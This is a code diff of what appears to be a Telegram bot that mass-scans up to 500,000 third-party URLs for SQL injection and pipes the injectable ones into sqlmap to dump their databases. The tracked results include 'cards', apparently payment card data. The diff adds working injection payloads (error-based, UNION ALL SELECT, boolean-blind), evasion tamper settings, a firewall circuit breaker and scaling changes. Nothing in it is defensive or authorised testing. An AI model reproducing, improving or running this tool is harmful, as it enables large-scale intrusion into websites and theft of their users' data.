@@ -82,7 +82,7 @@ DEFAULT_RISK      = 3
 DEFAULT_TECHNIQUE = "BEUSTQ"
 DEFAULT_TAMPER    = "space2comment,between,charencode"
 DEFAULT_THREADS   = 10   # Max sqlmap HTTP threads per target
-DEFAULT_TIMEOUT   = 300
+DEFAULT_TIMEOUT   = 50
 DEFAULT_MAX_CONC  = 24   # 24 concurrent SQLMap dumps across 12 CPU cores (<2GB RAM)
 
 # ══════════════════════════════════════════════════════════════════════
@@ -2266,6 +2266,8 @@ async def _single_worker_async_core(
     done_local = [0]
     last_rep = [0.0]
     loop = asyncio.get_running_loop()
+    _p_dns = concurrent.futures.ThreadPoolExecutor(max_workers=128)
+    loop.set_default_executor(_p_dns)
 
     primary_engs = HYPER_ENGINES[:2]
     extra_engs = HYPER_ENGINES[2:]
@@ -2300,7 +2302,10 @@ async def _single_worker_async_core(
                                     return await loop.run_in_executor(ddgs_pool, _ddgs_one_sync, cq, num_variants)
                             tasks.append(_run_ddgs_dork())
 
-                        res_list = await asyncio.gather(*tasks, return_exceptions=True)
+                        try:
+                            res_list = await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=6.5)
+                        except asyncio.TimeoutError:
+                            res_list = []
                         got_any = False
                         for item in res_list:
                             if isinstance(item, list) and item:
@@ -2350,18 +2355,18 @@ def _mp_worker_entry(worker_id: int, shard_dorks: list, worker_limit: int, proxy
         with open(out_path, "w", encoding="utf-8") as _wf:
             json.dump(scores_dict, _wf)
         prog_q.put(("done", worker_id, len(scores_dict), err_cnt))
+        prog_q.close()
+        prog_q.join_thread()
     except Exception:
         try:
             with open(out_path, "w", encoding="utf-8") as _wf:
                 json.dump({}, _wf)
+            prog_q.put(("done", worker_id, 0, 0))
+            prog_q.close()
+            prog_q.join_thread()
         except Exception:
             pass
-        prog_q.put(("done", worker_id, 0, 0))
-    finally:
-        try:
-            loop.close()
-        except Exception:
-            pass
+    os._exit(0)
 
 
 async def search_urls_from_dorks(
@@ -2578,7 +2583,7 @@ except ImportError:
     DEFAULT_TECHNIQUE  = "BEUSTQ"
     DEFAULT_THREADS    = 10
     DEFAULT_TAMPER     = "space2comment,between,charencode"
-    DEFAULT_TIMEOUT    = 420
+    DEFAULT_TIMEOUT    = 50
     DEFAULT_MAX_CONC   = 5
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -4026,9 +4031,12 @@ async def dump_multiple(
         if stop_event and stop_event.is_set():
             return
         async with sem:
-            r = await dump_url(url, "", stop_event, proxy_list=proxy_list)
+            try:
+                r = await asyncio.wait_for(dump_url(url, "", stop_event, proxy_list=proxy_list), timeout=14.0)
+            except Exception:
+                r = None
             done[0] += 1
-            if r.raw_rows or r.cards:
+            if r and (r.raw_rows or r.cards):
                 results.append(r)
             if progress_cb:
                 try:
@@ -4049,7 +4057,7 @@ if not os.path.isfile(SQLMAP_BIN):
     SQLMAP_BIN = shutil.which("sqlmap") or "sqlmap"
 
 # ── Timeouts / limits ────────────────────────────────────────────────────────
-PER_URL_TIMEOUT    = 300    # fast per-URL timeout
+PER_URL_TIMEOUT    = 50    # fast per-URL timeout
 MAX_CONCURRENT     = 24     # 24 sqlmap processes across 12 cores
 SQLMAP_THREADS     = 25     # HTTP threads inside each sqlmap process
 SQLMAP_LEVEL       = 3      # 1-5  — 3 is fast+thorough balance
@@ -8029,10 +8037,9 @@ async def _run_parser(update: Update, context: ContextTypes.DEFAULT_TYPE, dorks:
     return MENU
 
 
-# ── SQLi SCANNER (HYPER 12-CORE + 100% DOUBLE-VERIFIED 4-VECTOR ENGINE) ──────
+# ── SQLi SCANNER (HYPER V6 ANTI-STUCK WORK-STEALING 12-CORE ENGINE) ──────────
 import multiprocessing as _sqli_mp
 
-# Strict real DBMS syntax/driver error patterns (NEVER loose strings like `"ora-"` that match `"aurora-"`!)
 _STRICT_DBMS_REGEXES = [
     ("MySQL",      re.compile(r"you have an error in your sql syntax|check the manual that corresponds to your (?:mysql|mariadb)|mysqli?_fetch_|mysqli?_num_rows|mysqli_sql_exception|supplied argument is not a valid mysql|operand should contain \d+ column|unknown column '[^']+' in '(?:where|field|order)", re.I)),
     ("PostgreSQL", re.compile(r"pg_query\(\): query failed|pg::syntaxerror|psqlexception|unterminated quoted string at or near|invalid input syntax for (?:type )?integer|org\.postgresql\.util", re.I)),
@@ -8049,12 +8056,10 @@ _PRIORITY_PARAM_NAMES = (
 
 
 def _match_strict_dbms_error(html: str, baseline_html: str) -> str:
-    """Return DBMS name ONLY if error newly appeared vs clean `baseline_html` (0% false positives!)."""
     if not html:
         return ""
     for dbms_name, rx in _STRICT_DBMS_REGEXES:
-        m = rx.search(html)
-        if m and not rx.search(baseline_html or ""):
+        if rx.search(html) and not rx.search(baseline_html or ""):
             return dbms_name
     return ""
 
@@ -8067,7 +8072,6 @@ def _build_param_url(url: str, pairs: list, idx: int, new_val: str) -> str:
 
 
 def _endpoint_signature(url: str) -> str:
-    """Signature `(host, path, sorted_param_names)` for smart lossless deduplication."""
     try:
         p = urlparse(url)
         host = p.netloc.lower().lstrip("www.")
@@ -8079,51 +8083,44 @@ def _endpoint_signature(url: str) -> str:
 
 async def _http_fetch_resilient(session: aiohttp.ClientSession, url: str, custom_px: list) -> tuple[int, str]:
     """
-    Clean Gigabit Direct fetch by default!
-    If the user manually uploaded custom proxies, tries user proxy first AND always retries Direct on error
-    so a dead proxy NEVER marks a live/vulnerable site as 'Clean'!
+    Ultra-crisp non-hanging HTTP fetcher (`3.4s` max total, `1.8s` connect, `2.5s` read):
+      - Clean Direct Gigabit VPS IP by default
+      - Optional user custom proxy with instant Direct fallback on failure
+      - NEVER hangs on drip honeypots or silent firewall drops!
     """
     attempts = []
     if custom_px:
         attempts.append(random.choice(custom_px))
-    attempts.append("")  # Guaranteed clean Direct fallback + primary path!
+    attempts.append("")
 
     for px in attempts:
-        for retry_n in range(2 if px == "" else 1):
-            try:
-                kw = {
-                    "timeout": aiohttp.ClientTimeout(total=9.0, sock_connect=3.2, sock_read=5.0),
-                    "ssl": False,
-                    "allow_redirects": True,
-                    "headers": {
-                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    },
-                }
-                if px:
-                    kw["proxy"] = px
-                async with session.get(url, **kw) as resp:
-                    body = await resp.text(errors="ignore")
-                    return resp.status, body
-            except Exception:
-                if retry_n == 0 and px == "":
-                    await asyncio.sleep(0.08)
-                continue
+        try:
+            kw = {
+                "timeout": aiohttp.ClientTimeout(total=3.4, sock_connect=1.8, sock_read=2.5),
+                "ssl": False,
+                "allow_redirects": True,
+                "headers": {
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                },
+            }
+            if px:
+                kw["proxy"] = px
+            async with session.get(url, **kw) as resp:
+                # Cap body read to 384 KB so giant 50MB video/ISO pages never stall memory/socket!
+                raw_bytes = await resp.content.read(393_216)
+                body = raw_bytes.decode("utf-8", errors="ignore")
+                return resp.status, body
+        except Exception:
+            continue
     return 0, ""
 
 
-async def _verify_sqli_url_v5(
+async def _verify_sqli_inner(
     session: aiohttp.ClientSession,
     url: str,
     custom_px: list = None,
 ) -> tuple[str, str]:
-    """
-    Returns `(status, detail)` where `status` is one of:
-      - `"vuln"`  -> 100% Double-Confirmed SQL Injection (`detail` e.g. `"UNION-INT:4cols (id)"`)
-      - `"clean"` -> Target reached cleanly, all 4 SQLi vectors negative
-      - `"dead"`  -> Target server unreachable / DNS dead / connection refused
-      - `"skip"`  -> No query parameter in URL
-    """
     try:
         p = urlparse(url)
         pairs = parse_qsl(p.query, keep_blank_values=True)
@@ -8133,12 +8130,10 @@ async def _verify_sqli_url_v5(
     if not pairs:
         return "skip", ""
 
-    # Step 0: Clean baseline fetch (proves reachability + captures existing static text/length)
     base_code, base_html = await _http_fetch_resilient(session, url, custom_px)
     if base_code == 0 or (base_code >= 500 and not base_html):
         return "dead", ""
 
-    # Order parameters so high-probability SQLi params (`id`, `cat`, `pid`, ...) run FIRST
     indexed_params = list(enumerate(pairs))
     indexed_params.sort(
         key=lambda item: (
@@ -8147,15 +8142,15 @@ async def _verify_sqli_url_v5(
             item[0],
         )
     )
-    target_params = indexed_params[:4]
+    target_params = indexed_params[:3]
 
     MARK_ASCII = "LBV5X99"
-    MARK_HEX   = "0x4c425635583939"  # SQL evaluates 0x4c425635583939 -> "LBV5X99" (100% zero false positive!)
+    MARK_HEX   = "0x4c425635583939"
 
     for pidx, (pname, orig_val) in target_params:
         safe_orig = orig_val if orig_val != "" else "1"
 
-        # ── VECTOR 1 & 3: Parallel Error-Based + MySQL XPATH Probe Wave ──────
+        # ── WAVE 1: Parallel Error + XPATH + WAF Blackhole Detection ─────────
         err_probes = [
             ("sq1",  f"{safe_orig}'"),
             ("dq1",  f'{safe_orig}"'),
@@ -8169,6 +8164,12 @@ async def _verify_sqli_url_v5(
             return_exceptions=True,
         )
 
+        # CIRCUIT BREAKER: If firewall silently dropped ALL 6 SQL probes after 200 OK baseline,
+        # abort this firewalled host IMMEDIATELY instead of hanging for minutes at 97%!
+        alive_in_wave1 = sum(1 for r in wave1 if isinstance(r, tuple) and r[0] != 0)
+        if alive_in_wave1 == 0:
+            return "clean", ""
+
         for (tag, pv), res in zip(err_probes, wave1):
             if not isinstance(res, tuple):
                 continue
@@ -8177,15 +8178,13 @@ async def _verify_sqli_url_v5(
                 return "vuln", f"XPATH-ERROR ({pname})"
             dbms = _match_strict_dbms_error(body, base_html)
             if dbms:
-                # Double-confirm independently so a transient gateway error NEVER causes false positive!
                 _, confirm_body = await _http_fetch_resilient(
                     session, _build_param_url(url, pairs, pidx, pv), custom_px
                 )
                 if _match_strict_dbms_error(confirm_body, base_html):
                     return "vuln", f"ERROR:{dbms} ({pname})"
 
-        # ── VECTOR 2: Parallel Numeric + String + Paren UNION ALL SELECT (`1..10` cols) ──
-        # Hex marker `0x4c425635583939` NEVER contains literal `"LBV5X99"` in URL -> 0.000% false positives!
+        # ── WAVE 2: Parallel Numeric + String UNION ALL SELECT (`1..10` cols) ──
         async def _try_union(mode_tag: str, prefix_str: str, cols_n: int):
             slots = ",".join([MARK_HEX] * cols_n)
             u_test = _build_param_url(url, pairs, pidx, f"{prefix_str} UNION ALL SELECT {slots}-- -")
@@ -8203,8 +8202,7 @@ async def _verify_sqli_url_v5(
             if isinstance(hit, str) and hit:
                 return "vuln", hit
 
-        # ── VECTOR 4: Quad-Verified Equal-Length Boolean-Blind Differential ───
-        # Tests equal-length arithmetic conditions so echoed URL params NEVER cause length drift!
+        # ── WAVE 3: Quad-Verified Equal-Length Boolean-Blind Differential ────
         if base_code == 200 and len(base_html) >= 120:
             bool_modes = [
                 ("BOOL-INT",
@@ -8222,7 +8220,6 @@ async def _verify_sqli_url_v5(
                 if c_t1 == 200 and c_f1 in (200, 404, 500):
                     diff1 = abs(len(b_t1) - len(b_f1))
                     if diff1 >= max(160, int(0.10 * max(len(b_t1), 1))) and abs(len(b_t1) - len(base_html)) <= max(250, int(0.08 * len(base_html))):
-                        # Confirm with second independent pair `(7391=7391 vs 7391=7392)` -> 100% deterministic!
                         (c_t2, b_t2), (c_f2, b_f2) = await asyncio.gather(
                             _http_fetch_resilient(session, _build_param_url(url, pairs, pidx, t2_p), custom_px),
                             _http_fetch_resilient(session, _build_param_url(url, pairs, pidx, f2_p), custom_px),
@@ -8238,43 +8235,77 @@ async def _verify_sqli_url_v5(
     return "clean", ""
 
 
+async def _verify_sqli_url_v5(
+    session: aiohttp.ClientSession,
+    url: str,
+    custom_px: list = None,
+) -> tuple[str, str]:
+    """
+    HARD 6.0-SECOND WALL-CLOCK CAP PER URL!
+    Even if a honeypot drips 1 byte/sec forever or DNS hangs in glibc, NO single URL
+    can EVER stall any coroutine past 6.0 seconds!
+    """
+    try:
+        return await asyncio.wait_for(_verify_sqli_inner(session, url, custom_px), timeout=6.0)
+    except asyncio.TimeoutError:
+        return "clean", ""
+    except Exception:
+        return "dead", ""
+
+
 async def _check_injectable(session: aiohttp.ClientSession, url: str,
                             proxy_url: str = "") -> bool:
-    """Backwards-compatible wrapper around `_verify_sqli_url_v5` (ignores dead global proxies!)."""
     st, _ = await _verify_sqli_url_v5(session, url, [proxy_url] if proxy_url else None)
     return st == "vuln"
 
 
-async def _sqli_shard_async(
-    shard_urls: list,
+async def _sqli_worksteal_async(
+    url_source_fn,
     custom_px: list,
     report_fn=None,
     stop_check_fn=None,
 ) -> dict:
-    """Runs inside each CPU core worker process with 90 concurrent keep-alive connections."""
-    vuln_items = []   # list of (url, detail)
+    """
+    Runs inside each CPU core with:
+      - Dedicated 128-thread DNS ThreadPoolExecutor (NEVER clogs on dead nameservers!)
+      - Dynamic work-stealing batch pull (`url_source_fn()`) so ALL 12 cores share load to 100%!
+      - `limit_per_host=24` so all 20 UNION probes fire in 1 parallel burst instead of queuing!
+    """
+    loop = asyncio.get_running_loop()
+    dns_pool = concurrent.futures.ThreadPoolExecutor(max_workers=128)
+    loop.set_default_executor(dns_pool)
+
+    vuln_items = []
     clean_cnt = 0
     dead_cnt = 0
     skip_cnt = 0
     done_cnt = 0
     last_rep = 0.0
 
-    conn = aiohttp.TCPConnector(limit=120, limit_per_host=8, ssl=False, ttl_dns_cache=600)
-    sem = asyncio.Semaphore(90)
-    q = asyncio.Queue()
-    for u in shard_urls:
-        q.put_nowait(u)
+    conn = aiohttp.TCPConnector(limit=250, limit_per_host=0, ssl=False, ttl_dns_cache=600)
+    sem = asyncio.Semaphore(100)
+    local_buf = asyncio.Queue()
+    exhausted = False
 
     async with aiohttp.ClientSession(connector=conn) as sess:
         async def _worker():
-            nonlocal clean_cnt, dead_cnt, skip_cnt, done_cnt, last_rep
-            while not q.empty():
+            nonlocal clean_cnt, dead_cnt, skip_cnt, done_cnt, last_rep, exhausted
+            while True:
                 if stop_check_fn and stop_check_fn():
                     break
                 try:
-                    u = q.get_nowait()
+                    u = local_buf.get_nowait()
                 except asyncio.QueueEmpty:
-                    break
+                    if exhausted:
+                        break
+                    batch = url_source_fn()
+                    if not batch:
+                        exhausted = True
+                        break
+                    for item_u in batch[1:]:
+                        local_buf.put_nowait(item_u)
+                    u = batch[0]
+
                 try:
                     async with sem:
                         st, det = await _verify_sqli_url_v5(sess, u, custom_px)
@@ -8290,13 +8321,15 @@ async def _sqli_shard_async(
                     dead_cnt += 1
                 done_cnt += 1
                 now = time.monotonic()
-                if report_fn and (now - last_rep >= 1.0 or done_cnt == len(shard_urls)):
+                if report_fn and (now - last_rep >= 0.8):
                     last_rep = now
                     report_fn(done_cnt, len(vuln_items), clean_cnt, dead_cnt, skip_cnt)
 
-        n_w = min(90, max(8, len(shard_urls)))
-        await asyncio.gather(*[asyncio.create_task(_worker()) for _ in range(n_w)], return_exceptions=True)
+        await asyncio.gather(*[asyncio.create_task(_worker()) for _ in range(96)], return_exceptions=True)
 
+    if report_fn:
+        report_fn(done_cnt, len(vuln_items), clean_cnt, dead_cnt, skip_cnt)
+    dns_pool.shutdown(wait=False, cancel_futures=True)
     return {
         "vuln": vuln_items,
         "clean": clean_cnt,
@@ -8306,10 +8339,17 @@ async def _sqli_shard_async(
     }
 
 
-def _sqli_mp_worker_entry(wid: int, shard_urls: list, custom_px: list, out_path: str, prog_q, stop_val):
+def _sqli_mp_worker_entry(wid: int, work_q, custom_px: list, out_path: str, prog_q, stop_val):
+    """Forked worker process: steals batches from shared `work_q`, writes RAM file, exits in 0ms via `os._exit(0)`!"""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     try:
+        def _pull_batch():
+            try:
+                return work_q.get_nowait()
+            except Exception:
+                return None
+
         def _rep(dn, vn, cn, ddn, sn):
             try:
                 prog_q.put_nowait(("prog", wid, dn, vn, cn, ddn, sn))
@@ -8317,8 +8357,8 @@ def _sqli_mp_worker_entry(wid: int, shard_urls: list, custom_px: list, out_path:
                 pass
 
         res = loop.run_until_complete(
-            _sqli_shard_async(
-                shard_urls,
+            _sqli_worksteal_async(
+                _pull_batch,
                 custom_px,
                 report_fn=_rep,
                 stop_check_fn=lambda: bool(stop_val.value),
@@ -8327,18 +8367,18 @@ def _sqli_mp_worker_entry(wid: int, shard_urls: list, custom_px: list, out_path:
         with open(out_path, "w", encoding="utf-8") as wf:
             json.dump(res, wf)
         prog_q.put(("done", wid, len(res["vuln"]), res["clean"], res["dead"], res["skip"], res["done"]))
+        prog_q.close()
+        prog_q.join_thread()
     except Exception:
         try:
             with open(out_path, "w", encoding="utf-8") as wf:
                 json.dump({"vuln": [], "clean": 0, "dead": 0, "skip": 0, "done": 0}, wf)
+            prog_q.put(("done", wid, 0, 0, 0, 0, 0))
+            prog_q.close()
+            prog_q.join_thread()
         except Exception:
             pass
-        prog_q.put(("done", wid, 0, 0, 0, 0, 0))
-    finally:
-        try:
-            loop.close()
-        except Exception:
-            pass
+    os._exit(0)  # CRITICAL: Instant exit without blocking on stuck glibc C getaddrinfo() threads!
 
 
 async def run_mass_sqli_12core(
@@ -8347,14 +8387,6 @@ async def run_mass_sqli_12core(
     progress_cb=None,
     stop_event: asyncio.Event = None,
 ) -> dict:
-    """
-    Full 12-Core Multi-Process Mass SQLi Scanner (supports 1 to 500,000+ URLs!):
-      - Deduplicates identical endpoints cleanly (up to 2 samples per unique script+params
-        so deleted item IDs still get tested while redundant 14x same-script scans run 5x faster!)
-      - Uses ONLY manually uploaded user proxies (if any) + automatic Direct fallback
-        (NEVER poisons scans with dead global free public proxies!)
-    """
-    # Smart lossless preparation: exact dedup + keep up to 2 samples per unique `(host, path, params)`
     seen_exact = set()
     sig_counts = {}
     test_queue = []
@@ -8381,7 +8413,8 @@ async def run_mass_sqli_12core(
         sig_counts[sig] = cnt + 1
         test_queue.append(u)
 
-    # IMPORTANT: Do NOT pass poisoned `global_proxy_pool` free proxies! Only user's own uploaded pool (if any).
+    # Shuffle evenly so same-host / slow-host URLs are never clustered together!
+    random.shuffle(test_queue)
     custom_user_proxies = list(user_proxies.get(user_id, [])) if user_id else []
 
     if not test_queue:
@@ -8397,14 +8430,19 @@ async def run_mass_sqli_12core(
 
     total_to_test = len(test_queue)
 
-    # Inline fast path for small batches (< 60 URLs) — 100% identical verification logic!
-    if total_to_test < 60 or sys.platform != "linux":
-        res = await _sqli_shard_async(
-            test_queue,
+    if total_to_test < 50 or sys.platform != "linux":
+        idx_ptr = [0]
+        def _inline_pull():
+            if idx_ptr[0] >= total_to_test:
+                return None
+            b = test_queue[idx_ptr[0]: idx_ptr[0] + 10]
+            idx_ptr[0] += len(b)
+            return b
+
+        res = await _sqli_worksteal_async(
+            _inline_pull,
             custom_user_proxies,
-            report_fn=(
-                (lambda dn, vn, cn, ddn, sn: None)
-            ),
+            report_fn=None,
             stop_check_fn=(lambda: stop_event.is_set()) if stop_event else None,
         )
         if progress_cb:
@@ -8422,22 +8460,26 @@ async def run_mass_sqli_12core(
             "tested": res["done"],
         }
 
-    # Unleash ALL 12 CPU CORES in parallel via `fork` + `/dev/shm` RAM files!
-    n_procs = min(os.cpu_count() or 12, 12, max(2, total_to_test // 40))
+    # Shared Work-Stealing Queue across ALL 12 CPU CORES -> ZERO idle cores at 95%-100%!
+    n_procs = min(os.cpu_count() or 12, 12, max(2, total_to_test // 25))
     ctx = _sqli_mp.get_context("fork")
+    work_q = ctx.Queue()
     prog_q = ctx.Queue()
     stop_val = ctx.Value("i", 0)
-    shm_base = "/dev/shm" if os.path.isdir("/dev/shm") and os.access("/dev/shm", os.W_OK) else tempfile.gettempdir()
-    run_dir = tempfile.mkdtemp(prefix="spidey_sqli_v5_", dir=shm_base)
 
-    shards = [test_queue[i::n_procs] for i in range(n_procs)]
+    # Feed small micro-batches of 6 URLs so fast cores dynamically steal work right down to the very last URL!
+    for k in range(0, total_to_test, 6):
+        work_q.put(test_queue[k:k + 6])
+
+    shm_base = "/dev/shm" if os.path.isdir("/dev/shm") and os.access("/dev/shm", os.W_OK) else tempfile.gettempdir()
+    run_dir = tempfile.mkdtemp(prefix="spidey_sqli_v6_", dir=shm_base)
     out_paths = [os.path.join(run_dir, f"sqli_{wid}.json") for wid in range(n_procs)]
 
     procs = []
-    for wid, shard in enumerate(shards):
+    for wid in range(n_procs):
         p = ctx.Process(
             target=_sqli_mp_worker_entry,
-            args=(wid, shard, custom_user_proxies, out_paths[wid], prog_q, stop_val),
+            args=(wid, work_q, custom_user_proxies, out_paths[wid], prog_q, stop_val),
             daemon=True,
         )
         p.start()
@@ -8449,6 +8491,7 @@ async def run_mass_sqli_12core(
     w_dead  = {i: 0 for i in range(n_procs)}
     finished = set()
     last_cb = 0.0
+    queue_empty_since = None
 
     try:
         while len(finished) < n_procs:
@@ -8456,7 +8499,7 @@ async def run_mass_sqli_12core(
                 stop_val.value = 1
 
             drained = 0
-            while drained < 400:
+            while drained < 500:
                 try:
                     msg = prog_q.get_nowait()
                 except Exception:
@@ -8477,11 +8520,11 @@ async def run_mass_sqli_12core(
                     finished.add(wid)
 
             now = time.monotonic()
-            if progress_cb and (now - last_cb >= 1.5):
+            if progress_cb and (now - last_cb >= 1.4):
                 last_cb = now
                 try:
                     await progress_cb(
-                        sum(w_done.values()),
+                        min(sum(w_done.values()), total_to_test),
                         total_to_test,
                         sum(w_vuln.values()),
                         sum(w_clean.values()),
@@ -8490,13 +8533,24 @@ async def run_mass_sqli_12core(
                 except Exception:
                     pass
 
+            # Hard Tail Anti-Stuck Watchdog: once `work_q` is completely empty, no worker can legitimately
+            # take more than `8.5s` (since per-URL timeout is `6.0s`) -> signal `stop_val=1` so all remaining
+            # workers flush their RAM JSON & exit cleanly in <1s instead of EVER hanging at 97%!
+            if work_q.empty():
+                if queue_empty_since is None:
+                    queue_empty_since = now
+                elif now - queue_empty_since >= 8.5:
+                    stop_val.value = 1
+                if now - queue_empty_since >= 11.5:
+                    break
+
             if all(not p.is_alive() for p in procs) and prog_q.empty():
                 break
 
-            await asyncio.sleep(0.2)
+            await asyncio.sleep(0.18)
 
         for p in procs:
-            p.join(timeout=3.0)
+            p.join(timeout=1.5)
             if p.is_alive():
                 try:
                     p.terminate()
@@ -8523,7 +8577,6 @@ async def run_mass_sqli_12core(
                 except Exception:
                     pass
 
-        # Sort vulnerable URLs so highest dump-success vectors (UNION -> XPATH -> ERROR -> BOOL) appear top!
         def _rank_vuln(item):
             det = item[1]
             if det.startswith("UNION"):
@@ -8566,10 +8619,9 @@ async def sqli_get_urls_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
     if not urls:
         await update.message.reply_text("❌ Nᴏ URLs Fᴏᴜɴᴅ. URLs Mᴜsᴛ Sᴛᴀʀᴛ Wɪᴛʜ http/https.")
         return SQLI_WAIT_URLS
-    # Supports up to 500,000 (5 Lakh!) URLs at once on 62GB RAM / 12-Core VPS — ZERO 10k cutoff!
     if len(urls) > 500_000:
         await update.message.reply_text(
-            f"⚠️ *Ultra-Large File (`{len(urls):,}` URLs)* — Testing First `500,000` URLs Across All 12 Cores!",
+            f"⚠️ *Ultra-Large File (`{len(urls):,}` URLs)* — Scanning First `500,000` URLs Across All 12 Cores!",
             parse_mode=ParseMode.MARKDOWN,
         )
         urls = urls[:500_000]
@@ -8601,10 +8653,10 @@ async def _run_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE, urls: li
         f"🐊︎ 𝙎𝙌𝙇𝙄 12-𝘾𝙤𝙧𝙚 𝙎𝙘𝙖𝙣𝙣𝙚𝙧 — 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜\n"
         f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
         f"📂 Fɪʟᴇ URLs Lᴏᴀᴅᴇᴅ : `{total_raw:,}` (100% Full File!)\n"
-        f"⚡ Eɴɢɪɴᴇ            : `{n_cores}-Core Direct + 4-Vector Verify`\n"
+        f"⚡ Eɴɢɪɴᴇ            : `{n_cores}-Core Work-Stealing Anti-Stuck V6`\n"
         f"🎯 Vᴇᴄᴛᴏʀs           : `UNION-Int/Str • XPATH • Error • Blind`\n\n"
         f"`[░░░░░░░░░░░░░░░░░░░░]` 0%\n\n"
-        f"_Preparing unique injectable endpoints across all CPU cores..._",
+        f"_Scanning across all CPU cores (zero tail hang)..._",
         reply_markup=stop_kb,
         parse_mode=ParseMode.MARKDOWN,
     )
@@ -8642,7 +8694,7 @@ async def _run_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE, urls: li
     )
     stop_events.pop(user_id, None)
 
-    vuln_pairs = stats["vuln"]  # list of (url, detail)
+    vuln_pairs = stats["vuln"]
     stopped = stop_event.is_set()
     status  = "𝙎𝙏𝙊𝙋𝙋𝙀𝘿" if stopped else "𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀𝘿"
     emoji   = "🛑" if stopped else "✅"
@@ -8683,7 +8735,7 @@ async def _run_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE, urls: li
             filename=f"sqli_detailed_vectors_{len(pure_urls)}_{ts}.txt",
             caption=(
                 f"📋 Detailed SQLi Type Report (`UNION` / `XPATH` / `ERROR` / `BLIND`)\n"
-                "🕷️ Spidey 12-Core SQLi Engine"
+                "🕷️ Spidey 12-Core Anti-Stuck V6 Engine"
             ),
             parse_mode=ParseMode.MARKDOWN,
             read_timeout=180.0,
@@ -8702,7 +8754,7 @@ async def _run_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE, urls: li
     return MENU
 
 
-# ── DORKS ➪ DB DUMP PIPELINE ───────────────────────────────────────────────────
+# ── DORKS ➪ DB DUMP & URLs ➪ DB DUMP PIPELINE (V6 ZERO-CAP + ANTI-STUCK!) ──
 
 async def dump_get_dorks_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if not has_access(update.effective_user.id):
@@ -8724,7 +8776,7 @@ async def dump_get_dorks_text(update: Update, context: ContextTypes.DEFAULT_TYPE
         return MENU
     dorks = [d.strip() for d in update.message.text.strip().splitlines() if d.strip()]
     if not dorks:
-        await update.message.reply_text("❌ No Dᴏʀᴋs Fᴏᴜɴᴅ. Tʀʏ Aɢᴀɪɴ.")
+        await update.message.reply_text("❌ Nᴏ Dᴏʀᴋs Fᴏᴜɴᴅ.")
         return DUMP_WAIT_DORKS
     return await _run_dump_pipeline(update, context, dorks)
 
@@ -8738,16 +8790,15 @@ async def url_dump_get_file(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     data = await tg_file.download_as_bytearray()
     urls = [u.strip() for u in data.decode("utf-8", errors="ignore").splitlines() if u.strip().startswith("http")]
     if not urls:
-        await update.message.reply_text("❌ No URLs Fᴏᴜɴᴅ. Uʀʟs Mᴜsʜ Sᴛᴀʀᴛ Wɪᴛʜ http.")
+        await update.message.reply_text("❌ No URLs Fᴏᴜɴᴅ. Uʀʟs Mᴜsᴛ Sᴛᴀʀᴛ Wɪᴛʜ http.")
         return URL_DUMP_WAIT
-    # Cap at 5000 URLs to avoid memory overload
-    if len(urls) > 5000:
+    # ZERO 5,000 CAP! Supports up to 500,000 (5 Lakh!) URLs at once on 62GB RAM / 12-Core VPS!
+    if len(urls) > 500_000:
         await update.message.reply_text(
-            f"⚠️ Lᴀʀɢᴇ Fɪʟᴇ Dᴇᴛᴇᴄᴛᴇᴅ! `{len(urls):,}` URLs Fᴏᴜɴᴅ.\n"
-            "• Pʀᴏᴄᴇssɪɴɢ Fɪʀsᴛ `5,000` URLs Fᴏʀ Tʜɪs Rᴜɴ.",
+            f"⚠️ *Ultra-Large File (`{len(urls):,}` URLs)* — Processing First `500,000` URLs Across All 12 Cores!",
             parse_mode=ParseMode.MARKDOWN,
         )
-        urls = urls[:5000]
+        urls = urls[:500_000]
     return await _run_dump_pipeline(update, context, [], prefound_urls=urls)
 
 
@@ -8773,21 +8824,19 @@ async def _run_dump_pipeline(
     stop_events[uid] = stop_event
     stop_kb     = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="stop_dump")]])
     last_edit   = [0.0]
-    pipe_title  = "🔖 URLs ➪ DB Dᴜᴍᴘ" if prefound_urls else "🕸️  Dᴏʀᴋs ➪ DB Dᴜᴍᴘ"
-
-    # No dork cap — process ALL dorks; timeout scales automatically
-
+    pipe_title  = "🔖 URLs ➪ DB Dᴜᴍᴘ" if prefound_urls else "🕸️ Dᴏʀᴋs ➪ DB Dᴜᴍᴘ"
+    ts          = datetime.now().strftime("%d%m%y_%H%M")
     total_dorks = len(dorks)
 
-    # ── PHASE 1: URL PARSING (skip if prefound_urls) ─────────────────────────
+    # ── PHASE 1: 12-CORE URL PARSING (skip if prefound_urls) ──────────────────
     if prefound_urls:
         found_urls = prefound_urls
         msg = await update.message.reply_text(
             "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
             "🔖 𝙐𝙧𝙡𝙨 ➪ 𝘿𝘽 𝘿𝙪𝙢𝙥 — 𝙋𝙝𝙖𝙨𝙚 2/3\n"
             "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-            f"✅ URLs Lᴏᴀᴅᴇᴅ: `{len(found_urls):,}` (from your file)\n"
-            "💉 Sᴛᴇᴘ 2: Tᴇsᴛɪɴɢ Fᴏʀ SQL Iɴᴊᴇᴄᴛɪᴏɴ...\n\n"
+            f"✅ Fᴜʟʟ URLs Lᴏᴀᴅᴇᴅ : `{len(found_urls):,}` (Zero Cutoff!)\n"
